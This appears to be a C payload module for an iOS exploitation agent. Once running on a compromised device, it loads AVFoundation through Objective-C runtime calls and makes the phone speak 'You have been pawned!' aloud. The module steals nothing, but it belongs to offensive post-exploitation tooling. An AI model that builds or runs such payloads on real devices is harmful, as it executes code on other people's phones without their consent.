#include <payload.h>

static int PHAssetMediaTypeImage = 1;
static int PHAuthorizationStatusAuthorized = 3;

typedef void AVAudioSession;
typedef void AVSpeechSynthesizer;
typedef void AVSpeechUtterance;
typedef void AVSpeechSynthesisVoice;

void start(void *entry, agent_p agent)
{
    int dev_null = -1;
    int old_stderr = -1;
    int old_stdout = -1;
    uint64_t size = 0;

    log_info("Loading AVFoundation.framework");
    if (!objcLoadBundle("/System/Library/Frameworks/AVFoundation.framework")) {
        log_error("Failed to load AVFoundation.framework");
        return;
    }

    agent->trampoline.enable_log_null_redirection(agent);

    log_info("Speaking now");
    void* session = objcMsgSendCast()(objcGetClass(AVAudioSession), objcGetSelector(sharedInstance));
    objcMsgSendCast(void*, void**)(
        session,
        objcGetSelector(setCategory:error:),
        CFSTR("AVAudioSessionCategoryPlayback"),
        NULL
    );
    AVSpeechSynthesizer *synthesizer = objcAllocInitClass(AVSpeechSynthesizer);
    AVSpeechUtterance *utterance = objcMsgSendCast(void*)(
        objcGetClass(AVSpeechUtterance),
        objcGetSelector(speechUtteranceWithString:),
        CFSTR("You have been pawned!")
    );
    objcMsgSendCast(double)(
        utterance,
        objcGetSelector(setRate:),
        0.5f
    );
    objcMsgSendCast(void*)(
        utterance,
        objcGetSelector(setVoice:),
        objcMsgSendCast(void*)(
            objcGetClass(AVSpeechSynthesisVoice),
            objcGetSelector(voiceWithLanguage:),
            CFSTR("en-US")
        )
    );
    objcMsgSendCast(void*)(synthesizer, objcGetSelector(speakUtterance:), utterance);

    while ((BOOL)objcMsgSendCast()(synthesizer, objcGetSelector(isSpeaking)));
    agent->trampoline.sleep(3);

    agent->trampoline.disable_log_null_redirection(agent);
}
